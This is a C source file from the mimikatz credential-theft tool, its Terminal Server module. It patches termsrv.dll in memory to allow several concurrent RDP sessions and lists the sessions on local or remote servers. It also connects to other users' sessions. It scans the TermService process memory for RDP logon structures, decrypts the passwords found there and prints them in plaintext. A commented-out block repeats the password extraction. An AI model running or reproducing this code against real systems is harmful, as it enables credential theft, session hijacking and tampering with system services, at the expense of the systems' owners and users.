/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_ts.h"

const KUHL_M_C kuhl_m_c_ts[] = {
	{kuhl_m_ts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
	{kuhl_m_ts_sessions,	L"sessions",	NULL},
	{kuhl_m_ts_remote,		L"remote",		NULL},
	{kuhl_m_ts_logonpasswords, L"logonpasswords", L"[experimental] try to get passwords from running sessions"},
//	{kuhl_m_ts_logonpasswords2, L"logonpasswords2", L"[experimental] try to get passwords from running sessions"},
};
const KUHL_M kuhl_m_ts = {
	L"ts",	L"Terminal Server module", NULL,
	ARRAYSIZE(kuhl_m_c_ts), kuhl_m_c_ts, NULL, NULL
};

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_W10_1803_Query__CDefPolicy[] = {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
BYTE PTRN_W10_1809_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_W10_1803_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};
BYTE PATC_W10_1809_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#elif defined(_M_IX86)
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x3b, 0x81, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
#endif
BYTE PTRN_WIN5_TestLicence[]		= {0x83, 0xf8, 0x02, 0x7f};
BYTE PATC_WIN5_TestLicence[]		= {0x90, 0x90};
KULL_M_PATCH_GENERIC TermSrvMultiRdpReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_TestLicence),			PTRN_WIN5_TestLicence},			{sizeof(PATC_WIN5_TestLicence),			PATC_WIN5_TestLicence},			{3}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Query__CDefPolicy),	PTRN_WN60_Query__CDefPolicy},	{sizeof(PATC_WN60_Query__CDefPolicy),	PATC_WN60_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN6x_Query__CDefPolicy),	PTRN_WN6x_Query__CDefPolicy},	{sizeof(PATC_WN6x_Query__CDefPolicy),	PATC_WN6x_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_Query__CDefPolicy),	PTRN_WN81_Query__CDefPolicy},	{sizeof(PATC_WN81_Query__CDefPolicy),	PATC_WN81_Query__CDefPolicy},	{0}},
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1803_Query__CDefPolicy),	PTRN_W10_1803_Query__CDefPolicy},	{sizeof(PATC_W10_1803_Query__CDefPolicy),	PATC_W10_1803_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_Query__CDefPolicy),	PTRN_W10_1809_Query__CDefPolicy},	{sizeof(PATC_W10_1809_Query__CDefPolicy),	PATC_W10_1809_Query__CDefPolicy},	{0}},
#endif
};
NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[])
{
	kull_m_patch_genericProcessOrServiceFromBuild(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"TermService", L"termsrv.dll", TRUE);
	return STATUS_SUCCESS;
}

const PCWCHAR states[] = {L"Active", L"Connected", L"ConnectQuery", L"Shadow", L"Disconnected", L"Idle", L"Listen", L"Reset", L"Down", L"Init",};
NTSTATUS kuhl_m_ts_sessions(int argc, wchar_t * argv[])
{
	LPCWSTR szServer = NULL;
	PSESSIONIDW sessions;
	WINSTATIONINFORMATION info;
	WINSTATIONREMOTEADDRESS addr;
	BOOL locked;
	DWORD i, count, cur, ret;
	BOOL isCur = ProcessIdToSessionId(GetCurrentProcessId(), &cur);
	HANDLE hServer = SERVERHANDLE_CURRENT;
	wchar_t ip[46];

	if(kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL))
	{
		isCur = FALSE;
		kprintf(L"Remote server: %s\n", szServer);
		hServer = WinStationOpenServerW((PWSTR) szServer);
		if(!hServer)
			PRINT_ERROR_AUTO(L"WinStationOpenServerW");
	}

	if(hServer || !szServer)
	{
		if(WinStationEnumerateW(hServer, &sessions, &count))
		{
			for(i = 0; i < count; i++)
			{
				kprintf(L"\nSession: %s%u - %s\n  state: %s (%u)\n", (isCur && (cur == sessions[i].SessionId)) ? L"*" : L"", sessions[i].SessionId, sessions[i].WinStationName, (sessions[i].State < ARRAYSIZE(states)) ? states[sessions[i].State] : L"?", sessions[i].State);
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationInformation, &info, sizeof(WINSTATIONINFORMATION), &ret))
				{
					kprintf(L"  user : %s @ %s\n", info.UserName, info.Domain);
					if(*(PULONGLONG) &info.ConnectTime)
					{
						kprintf(L"  Conn : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.ConnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.DisconnectTime)
					{
						kprintf(L"  disc : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.DisconnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LogonTime)
					{
						kprintf(L"  logon: ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.LogonTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LastInputTime)
					{
						kprintf(L"  last : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.LastInputTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.CurrentTime)
					{
						kprintf(L"  curr : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.CurrentTime);
						kprintf(L"\n");
					}
				}
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationLockedState, &locked, sizeof(BOOL), &ret))
					kprintf(L"  lock : %s\n", locked ? L"yes" : L"no");
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationRemoteAddress, &addr, sizeof(WINSTATIONREMOTEADDRESS), &ret))
				{
					if(addr.sin_family == AF_INET)
					{
						if(RtlIpv4AddressToStringW((const IN_ADDR *) &addr.ipv4.in_addr, ip))
							kprintf(L"  addr4: %s\n", ip);
					}
					else if(addr.sin_family == 23) // AF_INET6
					{
						if(RtlIpv6AddressToStringW((const PVOID) &addr.ipv6.sin6_addr, ip))
							kprintf(L"  addr6: %s\n", ip);
					}
				}
			}
			if(!count)
				PRINT_ERROR(L"WinStationEnumerateW gave 0 result (maybe access problem?)\n");
			WinStationFreeMemory(sessions);
		}
		else PRINT_ERROR_AUTO(L"WinStationEnumerateW");
	}
	else PRINT_ERROR(L"No server HANDLE\n");
	if(hServer)
		WinStationCloseServer(hServer);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_ts_remote(int argc, wchar_t * argv[])
{
	LPCWSTR szId, szPassword;
	DWORD id, target;
	if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
	{
		id = wcstoul(szId, NULL, 0);
		if(kull_m_string_args_byName(argc, argv, L"target", &szId, NULL))
			target = wcstoul(szId, NULL, 0);
		else target = LOGONID_CURRENT;
		
		kull_m_string_args_byName(argc, argv, L"password", &szPassword, L"");

		kprintf(L"Asking to connect from %u to ", id);
		if(target == LOGONID_CURRENT)
			kprintf(L"current session");
		else kprintf(L"%u", target);
		
		kprintf(L"\n\n> ");
		if(WinStationConnectW(SERVERHANDLE_CURRENT, id, target, (LPWSTR) szPassword, FALSE))
			kprintf(L"Connected to %u\n", id);
		else if(GetLastError() == ERROR_LOGON_FAILURE)
			PRINT_ERROR(L"Bad password for this session (take care to not lock the account!)\n");
		else PRINT_ERROR_AUTO(L"WinStationConnect");
	}
	else PRINT_ERROR(L"Argument id is needed\n");
	return STATUS_SUCCESS;
}

const BYTE MyPattern[] = {0x00, 0x00, 0x00, 0x00, 0xbb, 0x47, 0x0b, 0x00};
NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
{
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	HANDLE hProcess;
	STRUCT_DATASEARCH myDataSearch = {NULL, {(LPVOID) MyPattern, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}};

	if(kull_m_service_getUniqueForName(L"TermService", &ServiceStatusProcess))
	{
		if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
		{
			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
			{
				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &myDataSearch.hMemory))
				{
					kull_m_process_getMemoryInformations(myDataSearch.hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, &myDataSearch);
					kull_m_memory_close(myDataSearch.hMemory);
				}
			}
			else PRINT_ERROR_AUTO(L"OpenProcess");
		}
		else PRINT_ERROR(L"Service is not running\n");
	}
	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	PSTRUCT_DATASEARCH pMyDataSearch = (PSTRUCT_DATASEARCH) pvArg;
	KULL_M_MEMORY_SEARCH sMemory;

	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = pMyDataSearch->hMemory;
		sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = pMemoryBasicInformation->BaseAddress;
		sMemory.kull_m_memoryRange.size = pMemoryBasicInformation->RegionSize;

		if(kull_m_memory_search(&pMyDataSearch->aPattern, sizeof(MyPattern), &sMemory, TRUE)) // lucky only one by segment
		{
			kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(pMyDataSearch->hMemory, sMemory.result);
		}
	}
	return TRUE;
}

void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr)
{
	WTS_KIWI clientData;
	KULL_M_MEMORY_ADDRESS aLocal = {&clientData, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {Addr, hProcess};
	BOOL decStatus = TRUE;

	if(aProcess.address)
	{
		if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(WTS_KIWI)))
		{
			if(clientData.cbDomain < sizeof(clientData.Domain))
			{
				if(clientData.cbUsername < sizeof(clientData.UserName))
				{
					if(clientData.cbPassword < sizeof(clientData.Password))
					{
						kprintf(
							L"\n   Domain     : %.*s\n"
							L"   UserName   : %.*s\n",
							clientData.cbDomain / sizeof(wchar_t), clientData.Domain,
							clientData.cbUsername/ sizeof(wchar_t), clientData.UserName
						);
						
						if(clientData.cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
						{
							decStatus = kull_m_crypto_remote_CryptUnprotectMemory(hProcess, clientData.Password, sizeof(clientData.Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
						}

						if(decStatus)
						{
							kprintf(L"   Password   : %.*s\n", clientData.cbPassword / sizeof(wchar_t), clientData.Password);
						}
					}
				}
			}
		}
	}
}

/*
const char c_CRDPWDUMXStack[] = "CRDPWDUMXStack";
NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[])
{
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	HANDLE hProcess;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;

	KULL_M_MEMORY_ADDRESS aPattern = {(LPVOID) c_CRDPWDUMXStack, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{NULL, NULL}, 0}, NULL};

	STRUCT_MYSEARCH mySearch = {NULL, 0xdbcaabcd, 0x00000001};
	STRUCT_DATASEARCH myDataSearch = {NULL, {&mySearch, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}};

	if(kull_m_service_getUniqueForName(L"TermService", &ServiceStatusProcess))
	{
		if(ServiceStatusProcess.dwCurrentState >= SERVICE_RUNNING)
		{
			if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, ServiceStatusProcess.dwProcessId))
			{
				if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory))
				{
					if(kull_m_process_getVeryBasicModuleInformationsForName(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory, (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_10_1809) ? L"rdpserverbase.dll" : L"rdpcorets.dll", &iModule))
					{
						kprintf(L"Module @ 0x%p (%u)\n", iModule.DllBase.address, iModule.SizeOfImage);
						
						sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = iModule.DllBase.address;
						sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
						
						if(kull_m_memory_search(&aPattern, sizeof(c_CRDPWDUMXStack), &sMemory, TRUE))
						{
							myDataSearch.hMemory = sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory;
							mySearch.pCRDPWDUMXStack = (LPCSTR) sMemory.result;
							kprintf(L"CRDPWDUMXStack @ 0x%p\n", mySearch.pCRDPWDUMXStack);
							kull_m_process_getMemoryInformations(myDataSearch.hMemory, kuhl_m_ts_logonpasswords_MemoryAnalysis, &myDataSearch);
						}
					}
					else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
					kull_m_memory_close(myDataSearch.hMemory);
				}
			}
			else PRINT_ERROR_AUTO(L"OpenProcess");
		}
		else PRINT_ERROR(L"Service is not running\n");
	}
	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");

	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
{
	PSTRUCT_DATASEARCH pMyDataSearch = (PSTRUCT_DATASEARCH) pvArg;
	KULL_M_MEMORY_SEARCH sMemory;

	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
	{
		sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = pMyDataSearch->hMemory;
		sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = pMemoryBasicInformation->BaseAddress;
		sMemory.kull_m_memoryRange.size = pMemoryBasicInformation->RegionSize;

		if(kull_m_memory_search(&pMyDataSearch->aPattern, sizeof(STRUCT_MYSEARCH), &sMemory, TRUE))
		{
			kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(pMyDataSearch->hMemory, (PBYTE) sMemory.result - FIELD_OFFSET(UNK_STRUCT0, pCRDPWDUMXStack));
		}
	}
	return TRUE;
}

void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr)
{
	UNK_STRUCT0 unkStruct0;
	PVOID unk0;
	WTS_KIWI clientData;
	KULL_M_MEMORY_ADDRESS aLocal = {&unkStruct0, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aProcess = {Addr, hProcess};

	if(Addr)
	{
		kprintf(L"\n[ %p ]\n", Addr);
		//kprintf(L"\nEntry\n=====\n");
		if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(UNK_STRUCT0)))
		{
			kprintf(L"  unkp0              : %p\n", unkStruct0.unkp0);
			kprintf(L"  unkp1              : %p\n", unkStruct0.unkp1);

			kprintf(L"  pCRDPWDUMXStack    : %p\n", unkStruct0.pCRDPWDUMXStack);
			kprintf(L"  unk0               : 0x%08x\n", unkStruct0.unk0);
			kprintf(L"  unk1               : 0x%08x\n", unkStruct0.unk1);

			kprintf(L"  unkThis0           : %p\n", unkStruct0.unkThis0);
			kprintf(L"  unk2               : 0x%08x\n", unkStruct0.unk2);

			kprintf(L"  unkp2              : %p\n", unkStruct0.unkp2);
			kprintf(L"  ImageBase          : %p\n", unkStruct0.ImageBase);
			kprintf(L"  unkp3              : %p\n", unkStruct0.unkp3);
			kprintf(L"  unkp4              : %p\n", unkStruct0.unkp4);
			kprintf(L"  unkp5              : %p\n", unkStruct0.unkp5);

			kprintf(L"  unk3               : 0x%08x\n", unkStruct0.unk3);
			kprintf(L"  unk4               : 0x%08x\n", unkStruct0.unk4);
			kprintf(L"  unk5               : 0x%08x\n", unkStruct0.unk5);
			kprintf(L"  unk6               : 0x%08x\n", unkStruct0.unk6);
			kprintf(L"  unk7               : 0x%08x\n", unkStruct0.unk7);

			kprintf(L"  unkp6              : %p\n", unkStruct0.unkp6);
			kprintf(L"  unkp7              : %p\n", unkStruct0.unkp7);
			kprintf(L"  unkp8              : %p\n", unkStruct0.unkp8);
			kprintf(L"  unkp9              : %p\n", unkStruct0.unkp9);
			kprintf(L"  unkp10             : %p\n", unkStruct0.unkp10);
			kprintf(L"  + 1160             : %p\n", (PBYTE) unkStruct0.unkp10 + 1160);
			kprintf(L"  unkp11             : %p\n", unkStruct0.unkp11);
			kprintf(L"  unkp12             : %p\n", unkStruct0.unkp12);

			aLocal.address = &unk0;
			aProcess.address = (PBYTE) unkStruct0.unkp10 + 1160; // 2019
			//aProcess.address = (PBYTE) unkStruct0.unkp8 + 1160; // 2016


			if(aProcess.address)
			{
				if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(PVOID)))
				{
					aLocal.address = &clientData;
					aProcess.address = unk0;

					if(aProcess.address)
					{
						if(kull_m_memory_copy(&aLocal, &aProcess, sizeof(WTS_KIWI)))
						{
							kull_m_string_wprintf_hex(&clientData, 8, 1); kprintf(L"\n");

							kprintf(L"   0          : 0x%08x\n", clientData.unk0);
							kprintf(L"   Magic      : 0x%08x\n", clientData.unk1);
							kprintf(L"   Domain     : %.*s\n", clientData.cbDomain / sizeof(wchar_t), clientData.Domain);
							kprintf(L"   UserName   : %.*s\n", clientData.cbUsername/ sizeof(wchar_t), clientData.UserName);
							// kprintf(L"   Password(e): "); kull_m_string_wprintf_hex(clientData.Password, sizeof(clientData.Password), 0); kprintf(L"\n");
							if(kull_m_crypto_remote_CryptUnprotectMemory(hProcess, clientData.Password, sizeof(clientData.Password), CRYPTPROTECTMEMORY_SAME_PROCESS))
							{
								kprintf(L"   Password   : %.*s\n", clientData.cbPassword / sizeof(wchar_t), clientData.Password);
							}
						}
					}
				}
			}
		}
	}
}
*/